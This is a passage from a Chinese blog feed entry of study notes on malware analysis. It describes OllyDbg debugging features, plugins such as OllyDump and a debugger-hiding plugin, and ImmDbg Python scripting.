Here，你可以很容易设置EIP寄存器的值）。</p></blockquote><p>上述步骤结束后，你就可以像对待正常应用程序一样运行、调试和单步整个shellcode了</p><h2 id="9x12-协助功能"><a href="#9x12-协助功能" class="headerlink" title="9x12 协助功能"></a>9x12 协助功能</h2><p>OllyDbg提供了多种机制来帮助分析，包括下面几种：</p><blockquote><p>  <strong>日志( Logging)</strong><br>  OllyDbg维护一个持续可用的事件日志。要访问这个日志，选择View-&gt;Log。此日志显示了加载的可执行模块、触发的断点，以及其他一些信息。另外，在分析过程中，日志还可以帮助你找出为到达某一特定状态而执行的那些操作。<br>    <strong>监视(Watches)窗口</strong><br>    OllyDbg支持使用监视窗口，用它可以查看你生成表达式的值。程序运行时，这个表达式会不断更新。你可以通过View—Watches，来访问监视窗口，你也可以在监视窗口中按下空格键，来设置表达式。<br>    <strong>帮助（Help）</strong>  OllyDbg的Help-&gt;Contents选项为运算表达式的书写提供了详细说明。当你想监视一些特定数据或者复杂函数时，这个帮助非常有用。例如，如果想监控EAX+ESP+4处的内存，你只需要输入表达式[EAX+ESP+4]。<br>    <strong>标注（Labeling）</strong>  如IDA Pro一样，你可以为OllyDbg中的子例程和循环添加标注。OllyDbg中的标注是为调试程序中某个地址设置的一个简单符号名称。为了在反汇编面板窗口设置标注，右击一个地址选择Label，此时会弹出提示输入标注的窗口。设置完标注以后，对这个地址的所有引用都会被该标注代替。</p></blockquote><h2 id="9x13-插件"><a href="#9x13-插件" class="headerlink" title="9x13 插件"></a>9x13 插件</h2><p>OllyDbg拥有一些标准插件，其中一些可以免费下载到。在网站 <a href="http://www.openrce.org/downloads/browse/OllyDbg_Plugins" target="_blank" rel="noopener">http://www.openrce.org/downloads/browse/OllyDbg_Plugins</a> 中，你可以找到一些对分析恶意代码有用的OllyDbg插件。<br>    OllyDbg的插件以DLL形式存在，如果要安装某个插件，你将这个插件的DLL放到OllyDbg的安装根目录下即可。一旦将DLL放入OllyDbg的安装根目录，OllyDbg会自动识别这个插件，并将其添加到插件菜单。</p><h3 id="1-OllyDump"><a href="#1-OllyDump" class="headerlink" title="1. OllyDump"></a>1. OllyDump</h3><p>OllyDump是OllyDbg最常使用的插件，它能够将一个被调试的进程转储成一个PE文件。当加载器加载一个可执行文件时，OllyDump会尝试逆向这个进程。然而，OllyDump利用的是进程内存中各段（代码段、数据段等）的状态。OllyDbg最典型的应用就是脱壳。</p><h3 id="2-调试器隐藏插件"><a href="#2-调试器隐藏插件" class="headerlink" title="2. 调试器隐藏插件"></a>2. 调试器隐藏插件</h3><p>调试器隐藏插件用多种方法对探测者隐藏调试器的存在。为了防止恶意代码使用反调试技术，恶意代码分析人员通常在分析恶意代码期间，一直运行调试器隐藏插件。这个插件主要针对IsDebuggerPresent检测、FindWindow检测、未处理异常欺骗以及用OutputDebugString反OllyDbg调试等反调试技术。</p><h3 id="3-命令行"><a href="#3-命令行" class="headerlink" title="3. 命令行"></a>3. 命令行</h3><p>要打开命令行窗口，选择Plugins-&gt;Command  Line-&gt;Command  Line。<br><img src="https://i.loli.net/2018/07/20/5b51a90a13474.jpg" alt="im"></p><h3 id="4-书签"><a href="#4-书签" class="headerlink" title="4. 书签"></a>4. 书签</h3><p>OllyDbg默认情况下自带书签插件，书签插件可以将一个内存位置加到书签中，利用书签，下次不需要记住就可以轻松获取那个内存地址。右击反汇编面板窗口中的地址，选择Bookmark-&gt;Insert Bookmark．可以添加书签。选择Plugins-&gt;Bookmarks-&gt;Bookmarks，可以浏览书签，然后单击书签可以跳转到该书签代表的地址。</p><h2 id="9x14-脚本调试"><a href="#9x14-脚本调试" class="headerlink" title="9x14 脚本调试"></a>9x14 脚本调试</h2><p>因为OllyDbg的插件被编译成DLL，创建或者修改一个插件往往是一个复杂的过程。因此，当需要扩展调试功能时，我们采用ImmDbg。它使用Python脚本来扩展功能，并且提供了易于使用的API接口。<br>    ImmDbg的Python API包含很多实用工具和函数。例如，可以将你的脚本像本地代码一样集成到调试器中，创建自定义的表格、图形和各种接u。利用脚本分析恶意代码的原因有多种，典型的包括反调试器补丁、内联函数钩子( hook)以及函数参数日志等，其中许多代码可以在网上找到。<br>    ImmDbg最常见的Python脚本类型是PyCommand．这个Python脚本位于ImmDbg安装目录下的PyCommands\目录中。编写好Python脚本后，必须将其放到这个目录下才能运行。这些脚本从命令栏运行，并且需要加上前缀“!”，如在命令行中输入!list命令，可以列出可用的PyCommand列表。<br>    PyCommand类型脚本拥有如下结构：</p><blockquote><p>．  一系列Import导入语句，用来导入Python的模块（同所有的Python脚本一样）。通过immlib或immutils模块访问ImmDbg的功能。<br>．    一个主函数，用来读取命令行参数（以Python列表传递）。<br>·  PyCommand的代码实现部分。<br>·  返回包含字符串的值。一旦脚本运行结束，主调试器会用这个返回字符串更新状态栏。</p></blockquote><p>From <a href="https://kabeor.github.io/第9章 OllyDbg/">https://kabeor.github.io/第9章 OllyDbg/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;OllyDbg&quot;&gt;&lt;a href=&quot;#OllyDbg&quot; class=&quot;headerlink&quot; title=&quot;OllyDbg&quot;&gt;&lt;/a&gt;OllyDbg&lt;/h1&gt;&lt;p&gt;OllyDbg被普遍用来分析恶意代码之前,最初的用途是破解软件。 Immunity Security
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
      <category term="第三篇 动态分析高级技术篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%B8%89%E7%AF%87-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
